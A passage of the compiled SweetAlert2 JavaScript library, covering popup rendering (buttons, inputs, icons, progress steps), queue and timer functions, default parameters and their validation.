    var cancelButton = getCancelButton(); // Actions (buttons) wrapper

    if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
      hide(actions);
    } // Custom class


    applyCustomClass(actions, params, 'actions'); // Render buttons

    renderButton(confirmButton, 'confirm', params);
    renderButton(denyButton, 'deny', params);
    renderButton(cancelButton, 'cancel', params);
    handleButtonsStyling(confirmButton, denyButton, cancelButton, params);

    if (params.reverseButtons) {
      actions.insertBefore(cancelButton, loader);
      actions.insertBefore(denyButton, loader);
      actions.insertBefore(confirmButton, loader);
    } // Loader


    setInnerHtml(loader, params.loaderHtml);
    applyCustomClass(loader, params, 'loader');
  };

  function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
    if (!params.buttonsStyling) {
      return removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
    }

    addClass([confirmButton, denyButton, cancelButton], swalClasses.styled); // Buttons background colors

    if (params.confirmButtonColor) {
      confirmButton.style.backgroundColor = params.confirmButtonColor;
    }

    if (params.denyButtonColor) {
      denyButton.style.backgroundColor = params.denyButtonColor;
    }

    if (params.cancelButtonColor) {
      cancelButton.style.backgroundColor = params.cancelButtonColor;
    }
  }

  function renderButton(button, buttonType, params) {
    toggle(button, params["show".concat(capitalizeFirstLetter(buttonType), "Button")], 'inline-block');
    setInnerHtml(button, params["".concat(buttonType, "ButtonText")]); // Set caption text

    button.setAttribute('aria-label', params["".concat(buttonType, "ButtonAriaLabel")]); // ARIA label
    // Add buttons custom classes

    button.className = swalClasses[buttonType];
    applyCustomClass(button, params, "".concat(buttonType, "Button"));
    addClass(button, params["".concat(buttonType, "ButtonClass")]);
  }

  function handleBackdropParam(container, backdrop) {
    if (typeof backdrop === 'string') {
      container.style.background = backdrop;
    } else if (!backdrop) {
      addClass([document.documentElement, document.body], swalClasses['no-backdrop']);
    }
  }

  function handlePositionParam(container, position) {
    if (position in swalClasses) {
      addClass(container, swalClasses[position]);
    } else {
      warn('The "position" parameter is not valid, defaulting to "center"');
      addClass(container, swalClasses.center);
    }
  }

  function handleGrowParam(container, grow) {
    if (grow && typeof grow === 'string') {
      var growClass = "grow-".concat(grow);

      if (growClass in swalClasses) {
        addClass(container, swalClasses[growClass]);
      }
    }
  }

  var renderContainer = function renderContainer(instance, params) {
    var container = getContainer();

    if (!container) {
      return;
    }

    handleBackdropParam(container, params.backdrop);

    if (!params.backdrop && params.allowOutsideClick) {
      warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
    }

    handlePositionParam(container, params.position);
    handleGrowParam(container, params.grow); // Custom class

    applyCustomClass(container, params, 'container'); // Set queue step attribute for getQueueStep() method

    var queueStep = document.body.getAttribute('data-swal2-queue-step');

    if (queueStep) {
      container.setAttribute('data-queue-step', queueStep);
      document.body.removeAttribute('data-swal2-queue-step');
    }
  };

  /**
   * This module containts `WeakMap`s for each effectively-"private  property" that a `Swal` has.
   * For example, to set the private property "foo" of `this` to "bar", you can `privateProps.foo.set(this, 'bar')`
   * This is the approach that Babel will probably take to implement private methods/fields
   *   https://github.com/tc39/proposal-private-methods
   *   https://github.com/babel/babel/pull/7555
   * Once we have the changes from that PR in Babel, and our core class fits reasonable in *one module*
   *   then we can use that language feature.
   */
  var privateProps = {
    promise: new WeakMap(),
    innerParams: new WeakMap(),
    domCache: new WeakMap()
  };

  var inputTypes = ['input', 'file', 'range', 'select', 'radio', 'checkbox', 'textarea'];
  var renderInput = function renderInput(instance, params) {
    var content = getContent();
    var innerParams = privateProps.innerParams.get(instance);
    var rerender = !innerParams || params.input !== innerParams.input;
    inputTypes.forEach(function (inputType) {
      var inputClass = swalClasses[inputType];
      var inputContainer = getChildByClass(content, inputClass); // set attributes

      setAttributes(inputType, params.inputAttributes); // set class

      inputContainer.className = inputClass;

      if (rerender) {
        hide(inputContainer);
      }
    });

    if (params.input) {
      if (rerender) {
        showInput(params);
      } // set custom class


      setCustomClass(params);
    }
  };

  var showInput = function showInput(params) {
    if (!renderInputType[params.input]) {
      return error("Unexpected type of input! Expected \"text\", \"email\", \"password\", \"number\", \"tel\", \"select\", \"radio\", \"checkbox\", \"textarea\", \"file\" or \"url\", got \"".concat(params.input, "\""));
    }

    var inputContainer = getInputContainer(params.input);
    var input = renderInputType[params.input](inputContainer, params);
    show(input); // input autofocus

    setTimeout(function () {
      focusInput(input);
    });
  };

  var removeAttributes = function removeAttributes(input) {
    for (var i = 0; i < input.attributes.length; i++) {
      var attrName = input.attributes[i].name;

      if (!(['type', 'value', 'style'].indexOf(attrName) !== -1)) {
        input.removeAttribute(attrName);
      }
    }
  };

  var setAttributes = function setAttributes(inputType, inputAttributes) {
    var input = getInput(getContent(), inputType);

    if (!input) {
      return;
    }

    removeAttributes(input);

    for (var attr in inputAttributes) {
      // Do not set a placeholder for <input type="range">
      // it'll crash Edge, #1298
      if (inputType === 'range' && attr === 'placeholder') {
        continue;
      }

      input.setAttribute(attr, inputAttributes[attr]);
    }
  };

  var setCustomClass = function setCustomClass(params) {
    var inputContainer = getInputContainer(params.input);

    if (params.customClass) {
      addClass(inputContainer, params.customClass.input);
    }
  };

  var setInputPlaceholder = function setInputPlaceholder(input, params) {
    if (!input.placeholder || params.inputPlaceholder) {
      input.placeholder = params.inputPlaceholder;
    }
  };

  var setInputLabel = function setInputLabel(input, prependTo, params) {
    if (params.inputLabel) {
      input.id = swalClasses.input;
      var label = document.createElement('label');
      var labelClass = swalClasses['input-label'];
      label.setAttribute('for', input.id);
      label.className = labelClass;
      addClass(label, params.customClass.inputLabel);
      label.innerText = params.inputLabel;
      prependTo.insertAdjacentElement('beforebegin', label);
    }
  };

  var getInputContainer = function getInputContainer(inputType) {
    var inputClass = swalClasses[inputType] ? swalClasses[inputType] : swalClasses.input;
    return getChildByClass(getContent(), inputClass);
  };

  var renderInputType = {};

  renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = function (input, params) {
    if (typeof params.inputValue === 'string' || typeof params.inputValue === 'number') {
      input.value = params.inputValue;
    } else if (!isPromise(params.inputValue)) {
      warn("Unexpected type of inputValue! Expected \"string\", \"number\" or \"Promise\", got \"".concat(_typeof(params.inputValue), "\""));
    }

    setInputLabel(input, input, params);
    setInputPlaceholder(input, params);
    input.type = params.input;
    return input;
  };

  renderInputType.file = function (input, params) {
    setInputLabel(input, input, params);
    setInputPlaceholder(input, params);
    return input;
  };

  renderInputType.range = function (range, params) {
    var rangeInput = range.querySelector('input');
    var rangeOutput = range.querySelector('output');
    rangeInput.value = params.inputValue;
    rangeInput.type = params.input;
    rangeOutput.value = params.inputValue;
    setInputLabel(rangeInput, range, params);
    return range;
  };

  renderInputType.select = function (select, params) {
    select.textContent = '';

    if (params.inputPlaceholder) {
      var placeholder = document.createElement('option');
      setInnerHtml(placeholder, params.inputPlaceholder);
      placeholder.value = '';
      placeholder.disabled = true;
      placeholder.selected = true;
      select.appendChild(placeholder);
    }

    setInputLabel(select, select, params);
    return select;
  };

  renderInputType.radio = function (radio) {
    radio.textContent = '';
    return radio;
  };

  renderInputType.checkbox = function (checkboxContainer, params) {
    var checkbox = getInput(getContent(), 'checkbox');
    checkbox.value = 1;
    checkbox.id = swalClasses.checkbox;
    checkbox.checked = Boolean(params.inputValue);
    var label = checkboxContainer.querySelector('span');
    setInnerHtml(label, params.inputPlaceholder);
    return checkboxContainer;
  };

  renderInputType.textarea = function (textarea, params) {
    textarea.value = params.inputValue;
    setInputPlaceholder(textarea, params);
    setInputLabel(textarea, textarea, params);

    var getPadding = function getPadding(el) {
      return parseInt(window.getComputedStyle(el).paddingLeft) + parseInt(window.getComputedStyle(el).paddingRight);
    };

    if ('MutationObserver' in window) {
      // #1699
      var initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);

      var outputsize = function outputsize() {
        var contentWidth = textarea.offsetWidth + getPadding(getPopup()) + getPadding(getContent());

        if (contentWidth > initialPopupWidth) {
          getPopup().style.width = "".concat(contentWidth, "px");
        } else {
          getPopup().style.width = null;
        }
      };

      new MutationObserver(outputsize).observe(textarea, {
        attributes: true,
        attributeFilter: ['style']
      });
    }

    return textarea;
  };

  var renderContent = function renderContent(instance, params) {
    var htmlContainer = getHtmlContainer();
    applyCustomClass(htmlContainer, params, 'htmlContainer'); // Content as HTML

    if (params.html) {
      parseHtmlToContainer(params.html, htmlContainer);
      show(htmlContainer, 'block'); // Content as plain text
    } else if (params.text) {
      htmlContainer.textContent = params.text;
      show(htmlContainer, 'block'); // No content
    } else {
      hide(htmlContainer);
    }

    renderInput(instance, params); // Custom class

    applyCustomClass(getContent(), params, 'content');
  };

  var renderFooter = function renderFooter(instance, params) {
    var footer = getFooter();
    toggle(footer, params.footer);

    if (params.footer) {
      parseHtmlToContainer(params.footer, footer);
    } // Custom class


    applyCustomClass(footer, params, 'footer');
  };

  var renderCloseButton = function renderCloseButton(instance, params) {
    var closeButton = getCloseButton();
    setInnerHtml(closeButton, params.closeButtonHtml); // Custom class

    applyCustomClass(closeButton, params, 'closeButton');
    toggle(closeButton, params.showCloseButton);
    closeButton.setAttribute('aria-label', params.closeButtonAriaLabel);
  };

  var renderIcon = function renderIcon(instance, params) {
    var innerParams = privateProps.innerParams.get(instance);
    var icon = getIcon(); // if the given icon already rendered, apply the styling without re-rendering the icon

    if (innerParams && params.icon === innerParams.icon) {
      // Custom or default content
      setContent(icon, params);
      applyStyles(icon, params);
      return;
    }

    if (!params.icon && !params.iconHtml) {
      return hide(icon);
    }

    if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
      error("Unknown icon! Expected \"success\", \"error\", \"warning\", \"info\" or \"question\", got \"".concat(params.icon, "\""));
      return hide(icon);
    }

    show(icon); // Custom or default content

    setContent(icon, params);
    applyStyles(icon, params); // Animate icon

    addClass(icon, params.showClass.icon);
  };

  var applyStyles = function applyStyles(icon, params) {
    for (var iconType in iconTypes) {
      if (params.icon !== iconType) {
        removeClass(icon, iconTypes[iconType]);
      }
    }

    addClass(icon, iconTypes[params.icon]); // Icon color

    setColor(icon, params); // Success icon background color

    adjustSuccessIconBackgoundColor(); // Custom class

    applyCustomClass(icon, params, 'icon');
  }; // Adjust success icon background color to match the popup background color


  var adjustSuccessIconBackgoundColor = function adjustSuccessIconBackgoundColor() {
    var popup = getPopup();
    var popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue('background-color');
    var successIconParts = popup.querySelectorAll('[class^=swal2-success-circular-line], .swal2-success-fix');

    for (var i = 0; i < successIconParts.length; i++) {
      successIconParts[i].style.backgroundColor = popupBackgroundColor;
    }
  };

  var setContent = function setContent(icon, params) {
    icon.textContent = '';

    if (params.iconHtml) {
      setInnerHtml(icon, iconContent(params.iconHtml));
    } else if (params.icon === 'success') {
      setInnerHtml(icon, "\n      <div class=\"swal2-success-circular-line-left\"></div>\n      <span class=\"swal2-success-line-tip\"></span> <span class=\"swal2-success-line-long\"></span>\n      <div class=\"swal2-success-ring\"></div> <div class=\"swal2-success-fix\"></div>\n      <div class=\"swal2-success-circular-line-right\"></div>\n    ");
    } else if (params.icon === 'error') {
      setInnerHtml(icon, "\n      <span class=\"swal2-x-mark\">\n        <span class=\"swal2-x-mark-line-left\"></span>\n        <span class=\"swal2-x-mark-line-right\"></span>\n      </span>\n    ");
    } else {
      var defaultIconHtml = {
        question: '?',
        warning: '!',
        info: 'i'
      };
      setInnerHtml(icon, iconContent(defaultIconHtml[params.icon]));
    }
  };

  var setColor = function setColor(icon, params) {
    if (!params.iconColor) {
      return;
    }

    icon.style.color = params.iconColor;
    icon.style.borderColor = params.iconColor;

    for (var _i = 0, _arr = ['.swal2-success-line-tip', '.swal2-success-line-long', '.swal2-x-mark-line-left', '.swal2-x-mark-line-right']; _i < _arr.length; _i++) {
      var sel = _arr[_i];
      setStyle(icon, sel, 'backgroundColor', params.iconColor);
    }

    setStyle(icon, '.swal2-success-ring', 'borderColor', params.iconColor);
  };

  var iconContent = function iconContent(content) {
    return "<div class=\"".concat(swalClasses['icon-content'], "\">").concat(content, "</div>");
  };

  var renderImage = function renderImage(instance, params) {
    var image = getImage();

    if (!params.imageUrl) {
      return hide(image);
    }

    show(image, ''); // Src, alt

    image.setAttribute('src', params.imageUrl);
    image.setAttribute('alt', params.imageAlt); // Width, height

    applyNumericalStyle(image, 'width', params.imageWidth);
    applyNumericalStyle(image, 'height', params.imageHeight); // Class

    image.className = swalClasses.image;
    applyCustomClass(image, params, 'image');
  };

  var currentSteps = [];
  /*
   * Global function for chaining sweetAlert popups
   */

  var queue = function queue(steps) {
    var Swal = this;
    currentSteps = steps;

    var resetAndResolve = function resetAndResolve(resolve, value) {
      currentSteps = [];
      resolve(value);
    };

    var queueResult = [];
    return new Promise(function (resolve) {
      (function step(i, callback) {
        if (i < currentSteps.length) {
          document.body.setAttribute('data-swal2-queue-step', i);
          Swal.fire(currentSteps[i]).then(function (result) {
            if (typeof result.value !== 'undefined') {
              queueResult.push(result.value);
              step(i + 1, callback);
            } else {
              resetAndResolve(resolve, {
                dismiss: result.dismiss
              });
            }
          });
        } else {
          resetAndResolve(resolve, {
            value: queueResult
          });
        }
      })(0);
    });
  };
  /*
   * Global function for getting the index of current popup in queue
   */

  var getQueueStep = function getQueueStep() {
    return getContainer() && getContainer().getAttribute('data-queue-step');
  };
  /*
   * Global function for inserting a popup to the queue
   */

  var insertQueueStep = function insertQueueStep(step, index) {
    if (index && index < currentSteps.length) {
      return currentSteps.splice(index, 0, step);
    }

    return currentSteps.push(step);
  };
  /*
   * Global function for deleting a popup from the queue
   */

  var deleteQueueStep = function deleteQueueStep(index) {
    if (typeof currentSteps[index] !== 'undefined') {
      currentSteps.splice(index, 1);
    }
  };

  var createStepElement = function createStepElement(step) {
    var stepEl = document.createElement('li');
    addClass(stepEl, swalClasses['progress-step']);
    setInnerHtml(stepEl, step);
    return stepEl;
  };

  var createLineElement = function createLineElement(params) {
    var lineEl = document.createElement('li');
    addClass(lineEl, swalClasses['progress-step-line']);

    if (params.progressStepsDistance) {
      lineEl.style.width = params.progressStepsDistance;
    }

    return lineEl;
  };

  var renderProgressSteps = function renderProgressSteps(instance, params) {
    var progressStepsContainer = getProgressSteps();

    if (!params.progressSteps || params.progressSteps.length === 0) {
      return hide(progressStepsContainer);
    }

    show(progressStepsContainer);
    progressStepsContainer.textContent = '';
    var currentProgressStep = parseInt(params.currentProgressStep === undefined ? getQueueStep() : params.currentProgressStep);

    if (currentProgressStep >= params.progressSteps.length) {
      warn('Invalid currentProgressStep parameter, it should be less than progressSteps.length ' + '(currentProgressStep like JS arrays starts from 0)');
    }

    params.progressSteps.forEach(function (step, index) {
      var stepEl = createStepElement(step);
      progressStepsContainer.appendChild(stepEl);

      if (index === currentProgressStep) {
        addClass(stepEl, swalClasses['active-progress-step']);
      }

      if (index !== params.progressSteps.length - 1) {
        var lineEl = createLineElement(params);
        progressStepsContainer.appendChild(lineEl);
      }
    });
  };

  var renderTitle = function renderTitle(instance, params) {
    var title = getTitle();
    toggle(title, params.title || params.titleText);

    if (params.title) {
      parseHtmlToContainer(params.title, title);
    }

    if (params.titleText) {
      title.innerText = params.titleText;
    } // Custom class


    applyCustomClass(title, params, 'title');
  };

  var renderHeader = function renderHeader(instance, params) {
    var header = getHeader(); // Custom class

    applyCustomClass(header, params, 'header'); // Progress steps

    renderProgressSteps(instance, params); // Icon

    renderIcon(instance, params); // Image

    renderImage(instance, params); // Title

    renderTitle(instance, params); // Close button

    renderCloseButton(instance, params);
  };

  var renderPopup = function renderPopup(instance, params) {
    var container = getContainer();
    var popup = getPopup(); // Width

    if (params.toast) {
      // #2170
      applyNumericalStyle(container, 'width', params.width);
      popup.style.width = '100%';
    } else {
      applyNumericalStyle(popup, 'width', params.width);
    } // Padding


    applyNumericalStyle(popup, 'padding', params.padding); // Background

    if (params.background) {
      popup.style.background = params.background;
    }

    hide(getValidationMessage()); // Classes

    addClasses(popup, params);
  };

  var addClasses = function addClasses(popup, params) {
    // Default Class + showClass when updating Swal.update({})
    popup.className = "".concat(swalClasses.popup, " ").concat(isVisible(popup) ? params.showClass.popup : '');

    if (params.toast) {
      addClass([document.documentElement, document.body], swalClasses['toast-shown']);
      addClass(popup, swalClasses.toast);
    } else {
      addClass(popup, swalClasses.modal);
    } // Custom class


    applyCustomClass(popup, params, 'popup');

    if (typeof params.customClass === 'string') {
      addClass(popup, params.customClass);
    } // Icon class (#1842)


    if (params.icon) {
      addClass(popup, swalClasses["icon-".concat(params.icon)]);
    }
  };

  var render = function render(instance, params) {
    renderPopup(instance, params);
    renderContainer(instance, params);
    renderHeader(instance, params);
    renderContent(instance, params);
    renderActions(instance, params);
    renderFooter(instance, params);

    if (typeof params.didRender === 'function') {
      params.didRender(getPopup());
    } else if (typeof params.onRender === 'function') {
      params.onRender(getPopup()); // @deprecated
    }
  };

  /*
   * Global function to determine if SweetAlert2 popup is shown
   */

  var isVisible$1 = function isVisible$$1() {
    return isVisible(getPopup());
  };
  /*
   * Global function to click 'Confirm' button
   */

  var clickConfirm = function clickConfirm() {
    return getConfirmButton() && getConfirmButton().click();
  };
  /*
   * Global function to click 'Deny' button
   */

  var clickDeny = function clickDeny() {
    return getDenyButton() && getDenyButton().click();
  };
  /*
   * Global function to click 'Cancel' button
   */

  var clickCancel = function clickCancel() {
    return getCancelButton() && getCancelButton().click();
  };

  function fire() {
    var Swal = this;

    for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
      args[_key] = arguments[_key];
    }

    return _construct(Swal, args);
  }

  /**
   * Returns an extended version of `Swal` containing `params` as defaults.
   * Useful for reusing Swal configuration.
   *
   * For example:
   *
   * Before:
   * const textPromptOptions = { input: 'text', showCancelButton: true }
   * const {value: firstName} = await Swal.fire({ ...textPromptOptions, title: 'What is your first name?' })
   * const {value: lastName} = await Swal.fire({ ...textPromptOptions, title: 'What is your last name?' })
   *
   * After:
   * const TextPrompt = Swal.mixin({ input: 'text', showCancelButton: true })
   * const {value: firstName} = await TextPrompt('What is your first name?')
   * const {value: lastName} = await TextPrompt('What is your last name?')
   *
   * @param mixinParams
   */
  function mixin(mixinParams) {
    var MixinSwal = /*#__PURE__*/function (_this) {
      _inherits(MixinSwal, _this);

      var _super = _createSuper(MixinSwal);

      function MixinSwal() {
        _classCallCheck(this, MixinSwal);

        return _super.apply(this, arguments);
      }

      _createClass(MixinSwal, [{
        key: "_main",
        value: function _main(params, priorityMixinParams) {
          return _get(_getPrototypeOf(MixinSwal.prototype), "_main", this).call(this, params, _extends({}, mixinParams, priorityMixinParams));
        }
      }]);

      return MixinSwal;
    }(this);

    return MixinSwal;
  }

  /**
   * Shows loader (spinner), this is useful with AJAX requests.
   * By default the loader be shown instead of the "Confirm" button.
   */

  var showLoading = function showLoading(buttonToReplace) {
    var popup = getPopup();

    if (!popup) {
      Swal.fire();
    }

    popup = getPopup();
    var actions = getActions();
    var loader = getLoader();

    if (!buttonToReplace && isVisible(getConfirmButton())) {
      buttonToReplace = getConfirmButton();
    }

    show(actions);

    if (buttonToReplace) {
      hide(buttonToReplace);
      loader.setAttribute('data-button-to-replace', buttonToReplace.className);
    }

    loader.parentNode.insertBefore(loader, buttonToReplace);
    addClass([popup, actions], swalClasses.loading);
    show(loader);
    popup.setAttribute('data-loading', true);
    popup.setAttribute('aria-busy', true);
    popup.focus();
  };

  var RESTORE_FOCUS_TIMEOUT = 100;

  var globalState = {};

  var focusPreviousActiveElement = function focusPreviousActiveElement() {
    if (globalState.previousActiveElement && globalState.previousActiveElement.focus) {
      globalState.previousActiveElement.focus();
      globalState.previousActiveElement = null;
    } else if (document.body) {
      document.body.focus();
    }
  }; // Restore previous active (focused) element


  var restoreActiveElement = function restoreActiveElement() {
    return new Promise(function (resolve) {
      var x = window.scrollX;
      var y = window.scrollY;
      globalState.restoreFocusTimeout = setTimeout(function () {
        focusPreviousActiveElement();
        resolve();
      }, RESTORE_FOCUS_TIMEOUT); // issues/900

      /* istanbul ignore if */

      if (typeof x !== 'undefined' && typeof y !== 'undefined') {
        // IE doesn't have scrollX/scrollY support
        window.scrollTo(x, y);
      }
    });
  };

  /**
   * If `timer` parameter is set, returns number of milliseconds of timer remained.
   * Otherwise, returns undefined.
   */

  var getTimerLeft = function getTimerLeft() {
    return globalState.timeout && globalState.timeout.getTimerLeft();
  };
  /**
   * Stop timer. Returns number of milliseconds of timer remained.
   * If `timer` parameter isn't set, returns undefined.
   */

  var stopTimer = function stopTimer() {
    if (globalState.timeout) {
      stopTimerProgressBar();
      return globalState.timeout.stop();
    }
  };
  /**
   * Resume timer. Returns number of milliseconds of timer remained.
   * If `timer` parameter isn't set, returns undefined.
   */

  var resumeTimer = function resumeTimer() {
    if (globalState.timeout) {
      var remaining = globalState.timeout.start();
      animateTimerProgressBar(remaining);
      return remaining;
    }
  };
  /**
   * Resume timer. Returns number of milliseconds of timer remained.
   * If `timer` parameter isn't set, returns undefined.
   */

  var toggleTimer = function toggleTimer() {
    var timer = globalState.timeout;
    return timer && (timer.running ? stopTimer() : resumeTimer());
  };
  /**
   * Increase timer. Returns number of milliseconds of an updated timer.
   * If `timer` parameter isn't set, returns undefined.
   */

  var increaseTimer = function increaseTimer(n) {
    if (globalState.timeout) {
      var remaining = globalState.timeout.increase(n);
      animateTimerProgressBar(remaining, true);
      return remaining;
    }
  };
  /**
   * Check if timer is running. Returns true if timer is running
   * or false if timer is paused or stopped.
   * If `timer` parameter isn't set, returns undefined
   */

  var isTimerRunning = function isTimerRunning() {
    return globalState.timeout && globalState.timeout.isRunning();
  };

  var bodyClickListenerAdded = false;
  var clickHandlers = {};
  function bindClickHandler() {
    var attr = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 'data-swal-template';
    clickHandlers[attr] = this;

    if (!bodyClickListenerAdded) {
      document.body.addEventListener('click', bodyClickListener);
      bodyClickListenerAdded = true;
    }
  }

  var bodyClickListener = function bodyClickListener(event) {
    // 1. using .parentNode instead of event.path because of better support by old browsers https://stackoverflow.com/a/39245638
    // 2. using .parentNode instead of .parentElement because of IE11 + SVG https://stackoverflow.com/a/36270354
    for (var el = event.target; el && el !== document; el = el.parentNode) {
      for (var attr in clickHandlers) {
        var template = el.getAttribute(attr);

        if (template) {
          clickHandlers[attr].fire({
            template: template
          });
          return;
        }
      }
    }
  };

  var defaultParams = {
    title: '',
    titleText: '',
    text: '',
    html: '',
    footer: '',
    icon: undefined,
    iconColor: undefined,
    iconHtml: undefined,
    template: undefined,
    toast: false,
    animation: true,
    showClass: {
      popup: 'swal2-show',
      backdrop: 'swal2-backdrop-show',
      icon: 'swal2-icon-show'
    },
    hideClass: {
      popup: 'swal2-hide',
      backdrop: 'swal2-backdrop-hide',
      icon: 'swal2-icon-hide'
    },
    customClass: {},
    target: 'body',
    backdrop: true,
    heightAuto: true,
    allowOutsideClick: true,
    allowEscapeKey: true,
    allowEnterKey: true,
    stopKeydownPropagation: true,
    keydownListenerCapture: false,
    showConfirmButton: true,
    showDenyButton: false,
    showCancelButton: false,
    preConfirm: undefined,
    preDeny: undefined,
    confirmButtonText: 'OK',
    confirmButtonAriaLabel: '',
    confirmButtonColor: undefined,
    denyButtonText: 'No',
    denyButtonAriaLabel: '',
    denyButtonColor: undefined,
    cancelButtonText: 'Cancel',
    cancelButtonAriaLabel: '',
    cancelButtonColor: undefined,
    buttonsStyling: true,
    reverseButtons: false,
    focusConfirm: true,
    focusDeny: false,
    focusCancel: false,
    showCloseButton: false,
    closeButtonHtml: '&times;',
    closeButtonAriaLabel: 'Close this dialog',
    loaderHtml: '',
    showLoaderOnConfirm: false,
    showLoaderOnDeny: false,
    imageUrl: undefined,
    imageWidth: undefined,
    imageHeight: undefined,
    imageAlt: '',
    timer: undefined,
    timerProgressBar: false,
    width: undefined,
    padding: undefined,
    background: undefined,
    input: undefined,
    inputPlaceholder: '',
    inputLabel: '',
    inputValue: '',
    inputOptions: {},
    inputAutoTrim: true,
    inputAttributes: {},
    inputValidator: undefined,
    returnInputValueOnDeny: false,
    validationMessage: undefined,
    grow: false,
    position: 'center',
    progressSteps: [],
    currentProgressStep: undefined,
    progressStepsDistance: undefined,
    onBeforeOpen: undefined,
    onOpen: undefined,
    willOpen: undefined,
    didOpen: undefined,
    onRender: undefined,
    didRender: undefined,
    onClose: undefined,
    onAfterClose: undefined,
    willClose: undefined,
    didClose: undefined,
    onDestroy: undefined,
    didDestroy: undefined,
    scrollbarPadding: true
  };
  var updatableParams = ['allowEscapeKey', 'allowOutsideClick', 'background', 'buttonsStyling', 'cancelButtonAriaLabel', 'cancelButtonColor', 'cancelButtonText', 'closeButtonAriaLabel', 'closeButtonHtml', 'confirmButtonAriaLabel', 'confirmButtonColor', 'confirmButtonText', 'currentProgressStep', 'customClass', 'denyButtonAriaLabel', 'denyButtonColor', 'denyButtonText', 'didClose', 'didDestroy', 'footer', 'hideClass', 'html', 'icon', 'iconColor', 'iconHtml', 'imageAlt', 'imageHeight', 'imageUrl', 'imageWidth', 'onAfterClose', 'onClose', 'onDestroy', 'progressSteps', 'reverseButtons', 'showCancelButton', 'showCloseButton', 'showConfirmButton', 'showDenyButton', 'text', 'title', 'titleText', 'willClose'];
  var deprecatedParams = {
    animation: 'showClass" and "hideClass',
    onBeforeOpen: 'willOpen',
    onOpen: 'didOpen',
    onRender: 'didRender',
    onClose: 'willClose',
    onAfterClose: 'didClose',
    onDestroy: 'didDestroy'
  };
  var toastIncompatibleParams = ['allowOutsideClick', 'allowEnterKey', 'backdrop', 'focusConfirm', 'focusDeny', 'focusCancel', 'heightAuto', 'keydownListenerCapture'];
  /**
   * Is valid parameter
   * @param {String} paramName
   */

  var isValidParameter = function isValidParameter(paramName) {
    return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
  };
  /**
   * Is valid parameter for Swal.update() method
   * @param {String} paramName
   */

  var isUpdatableParameter = function isUpdatableParameter(paramName) {
    return updatableParams.indexOf(paramName) !== -1;
  };
  /**
   * Is deprecated parameter
   * @param {String} paramName
   */

  var isDeprecatedParameter = function isDeprecatedParameter(paramName) {
    return deprecatedParams[paramName];
  };

  var checkIfParamIsValid = function checkIfParamIsValid(param) {
    if (!isValidParameter(param)) {
      warn("Unknown parameter \"".concat(param, "\""));
    }
  };

  var checkIfToastParamIsValid = function checkIfToastParamIsValid(param) {
    if (toastIncompatibleParams.indexOf(param) !== -1) {
      warn("The parameter \"".concat(param, "\" is incompatible with toasts"));
    }
  };

  var checkIfParamIsDeprecated = function checkIfParamIsDeprecated(param) {
    if (isDeprecatedParameter(param)) {
      warnAboutDeprecation(param, isDeprecatedParameter(param));
    }
  };
  /**
   * Show relevant warnings for given params
   *
   * @param params
   */


  var showWarningsForParams = function showWarningsForParams(params) {
    for (var param in params) {
      checkIfParamIsValid(param);

      if (params.toast) {
        checkIfToastParamIsValid(param);
      }

      checkIfParamIsDeprecated(param);
    }
  };



  var staticMethods = /*#__PURE__*/Object.freeze({
    isValidParameter: isValidParameter,
    isUpdatableParameter: isUpdatableParameter,
    isDeprecatedParameter: isDeprecatedParameter,
    argsToParams: argsToParams,
    isVisible: isVisible$1,
    clickConfirm: clickConfirm,
    clickDeny: clickDeny,
    clickCancel: clickCancel,
    getContainer: getContainer,
    getPopup: getPopup,
    getTitle: getTitle,
    getContent: getContent,
    getHtmlContainer: getHtmlContainer,
    getImage: getImage,
    getIcon: getIcon,
    getInputLabel: getInputLabel,
    getCloseButton: getCloseButton,
    getActions: getActions,
    getConfirmButton: getConfirmButton,
    getDenyButton: getDenyButton,
    getCancelButton: getCancelButton,
    getLoader: getLoader,
    getHeader: getHeader,
    getFooter: getFooter,
    getTimerProgressBar: getTimerProgressBar,
    getFocusableElements: getFocusableElements,
    getValidationMessage: getValidationMessage,
    isLoading: isLoading,
    fire: fire,
    mixin: mixin,
    queue: queue,
    getQueueStep: getQueueStep,
    insertQueueStep: insertQueueStep,
    deleteQueueStep: deleteQueueStep,
    showLoading: showLoading,
    enableLoading: showLoading,
    getTimerLeft: getTimerLeft,
    stopTimer: stopTimer,
    resumeTimer: resumeTimer,
    toggleTimer: toggleTimer,
    increaseTimer: increaseTimer,
    isTimerRunning: isTimerRunning,
    bindClickHandler: bindClickHandler
  });

  /**
   * Hides loader and shows back the button which was hidden by .showLoading()
   */

  function hideLoading() {
    // do nothing if popup is closed
    var innerParams = privateProps.innerParams.get(this);

    if (!innerParams) {
      return;
    }

    var domCache = privateProps.domCache.get(this);
    hide(domCache.loader);
    var buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute('data-button-to-replace'));

    if (buttonToReplace.length) {
      show(buttonToReplace[0], 'inline-block');
    } else if (allButtonsAreHidden()) {
      hide(domCache.actions);
    }

    removeClass([domCache.popup, domCache.actions], swalClasses.loading);
    domCache.popup.removeAttribute('aria-busy');
    domCache.popup.removeAttribute('data-loading');
    domCache.confirmButton.disabled = false;
    domCache.denyButton.disabled = false;
    domCache.cancelButton.disabled = false;
  }

  function getInput$1(instance) {
    var innerParams = privateProps.innerParams.get(instance || this);
    var domCache = privateProps.domCache.get(instance || this);

    if (!domCache) {
      return null;
    }

    return getInput(domCache.content, innerParams.input);
  }

  var fixScrollbar = function fixScrollbar() {
    // for queues, do not do this more than once
    if (states.previousBodyPadding !== null) {
      return;
    } // if the body has overflow


    if (document.body.scrollHeight > window.innerHeight) {
      // add padding so the content doesn't shift after removal of scrollbar
      states.previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue('padding-right'));
      document.body.style.paddingRight = "".concat(states.previousBodyPadding + measureScrollbar(), "px");
    }
  };
  var undoScrollbar = function undoScrollbar() {
    if (states.previousBodyPadding !== null) {
      document.body.style.paddingRight = "".concat(states.previousBodyPadding, "px");
      states.previousBodyPadding = null;
    }
  };

  /* istanbul ignore file */
